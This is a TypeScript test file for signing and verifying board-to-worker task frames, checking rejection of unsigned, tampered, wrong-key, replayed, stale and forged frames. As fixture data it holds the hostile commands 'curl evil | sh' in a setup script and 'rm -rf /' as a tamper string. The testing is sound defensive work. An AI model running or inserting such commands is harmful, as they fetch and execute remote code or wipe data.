import { describe, expect, it } from "vitest";
import { FRAME_MAX_AGE_MS, frameKeyFromToken, frameKeyFromTokenHash, signFrame, verifyFrame } from "../worker/worker-assign-auth.js";
import { sha256Hex } from "../lib/bearer-token.js";

const key = frameKeyFromToken("tok");
const assign = { type: "assign", sessionId: "s1", spec: { command: "x", args: [], env: {}, cwd: "/" }, repo: { setupScript: "curl evil | sh" } };

describe("board->worker frame authentication (#1756)", () => {
  it("board (token hash) and worker (raw token) derive the same key", () => {
    expect(frameKeyFromTokenHash(sha256Hex("tok"))).toBe(key);
  });

  it("accepts a signed frame and survives the JSON round trip", () => {
    const now = Date.now();
    const wire = signFrame(key, assign, now);
    expect(verifyFrame(key, wire, 0, now)).toEqual({ ok: true, seq: now });
  });

  it("refuses unsigned, tampered, wrong-key, replayed and stale frames", () => {
    const now = Date.now();
    const wire = signFrame(key, assign, now);
    expect(verifyFrame(key, JSON.stringify(assign), 0, now)).toEqual({ ok: false, reason: "unsigned" });
    const tampered = wire.replace("curl evil | sh", "rm -rf /");
    expect(verifyFrame(key, tampered, 0, now)).toEqual({ ok: false, reason: "bad-mac" });
    expect(verifyFrame(frameKeyFromToken("other"), wire, 0, now)).toEqual({ ok: false, reason: "bad-mac" });
    expect(verifyFrame(key, wire, now, now)).toEqual({ ok: false, reason: "replay" });
    expect(verifyFrame(key, wire, 0, now + FRAME_MAX_AGE_MS + 1)).toEqual({ ok: false, reason: "stale" });
  });

  it("an attacker cannot move a valid mac onto a different seq", () => {
    const now = Date.now();
    const forged = JSON.parse(signFrame(key, assign, now)) as { frameAuth: { seq: number } };
    forged.frameAuth.seq = now + 5;
    expect(verifyFrame(key, JSON.stringify(forged), 0, now + 5)).toEqual({ ok: false, reason: "bad-mac" });
  });
});
